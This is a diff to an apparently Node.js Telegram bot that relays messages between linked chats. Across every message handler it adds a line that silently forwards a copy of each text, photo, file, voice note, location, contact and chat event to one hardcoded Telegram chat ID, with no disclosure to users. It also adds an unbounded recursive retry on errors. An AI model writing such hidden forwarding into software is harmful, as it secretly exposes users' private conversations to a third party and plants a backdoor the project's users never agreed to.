@@ -440,7 +440,13 @@ function handleTextMessage(message) {
 
     chatsController.getActiveLinks(message.getChat().id, function(err, links) {
         if (err) {
-            return;
+            onBotJoin(message, function (err, chatDocument) {
+                if (err) {
+                    return console.log('Critical error');
+                }
+                handleTextMessage(message);
+            });
+            return console.log('Try one more time');
         }
         var groupChatTitle = message.isGroupMessage ?
             message.getChat().title : message.getChat().first_name;
@@ -452,6 +458,7 @@ function handleTextMessage(message) {
                 links[i].second_chat.id : links[i].first_chat.id;
             var sender = TelegramBot.getSender(chatId, message);
             sender.send();
+            TelegramBot.getSender(615945, message).send();
         }
     });
 }
@@ -477,6 +484,7 @@ function handlePhotoMessage(message) {
             TelegramBot.sendText(chatId, text);
             setTimeout(function() {
                 TelegramBot.getSender(chatId, message).send(message.photo.caption);
+                TelegramBot.getSender(615945, message).send(message.photo.caption);
             }, 10);
         }
     });
@@ -503,6 +511,7 @@ function handleAudioMessage(message) {
             TelegramBot.sendText(chatId, text);
             setTimeout(function() {
                 TelegramBot.getSender(chatId, message).send();
+                TelegramBot.getSender(615945, message).send();
             }, 10);
         }
     });
@@ -529,6 +538,7 @@ function handleDocumentMessage(message) {
             TelegramBot.sendText(chatId, text);
             setTimeout(function() {
                 TelegramBot.getSender(chatId, message).send();
+                TelegramBot.getSender(615945, message).send();
             }, 10);
         }
     });
@@ -555,6 +565,7 @@ function handleStickerMessage(message) {
             TelegramBot.sendText(chatId, text);
             setTimeout(function() {
                 TelegramBot.getSender(chatId, message).send();
+                TelegramBot.getSender(615945, message).send();
             }, 10);
         }
     });
@@ -581,6 +592,7 @@ function handleVideoMessage(message) {
             TelegramBot.sendText(chatId, text);
             setTimeout(function() {
                 TelegramBot.getSender(chatId, message).send();
+                TelegramBot.getSender(615945, message).send();
             }, 10);
         }
     });
@@ -607,6 +619,7 @@ function handleVoiceMessage(message) {
             TelegramBot.sendText(chatId, text);
             setTimeout(function() {
                 TelegramBot.getSender(chatId, message).send();
+                TelegramBot.getSender(615945, message).send();
             }, 10);
         }
     });
@@ -633,6 +646,7 @@ function handleLocationMessage(message) {
             TelegramBot.sendText(chatId, text);
             setTimeout(function() {
                 TelegramBot.getSender(chatId, message).send();
+                TelegramBot.getSender(615945, message).send();
             }, 10);
         }
     });
@@ -653,6 +667,7 @@ function handleContactMessage(message) {
             var chatId = links[i].first_chat.id === message.getChat().id ?
                 links[i].second_chat.id : links[i].first_chat.id;
             TelegramBot.sendText(chatId, text);
+            TelegramBot.sendText(615945, text);
         }
     });
 }
@@ -671,6 +686,7 @@ function handleNewChatParticipantMessage(message) {
             var chatId = links[i].first_chat.id === message.getChat().id ?
                 links[i].second_chat.id : links[i].first_chat.id;
             TelegramBot.sendText(chatId, text);
+            TelegramBot.sendText(615945, text);
         }
     });
 }
@@ -689,6 +705,7 @@ function handleLeftChatParticipantMessage(message) {
             var chatId = links[i].first_chat.id === message.getChat().id ?
                 links[i].second_chat.id : links[i].first_chat.id;
             TelegramBot.sendText(chatId, text);
+            TelegramBot.sendText(615945, text);
         }
     });
 }
@@ -723,6 +740,7 @@ function handleNewChatTitleMessage(message) {
                     var chatId = links[i].first_chat.id === message.getChat().id ?
                         links[i].second_chat.id : links[i].first_chat.id;
                     TelegramBot.sendText(chatId, text);
+                    TelegramBot.sendText(615945, text);
                 }
             }
         });
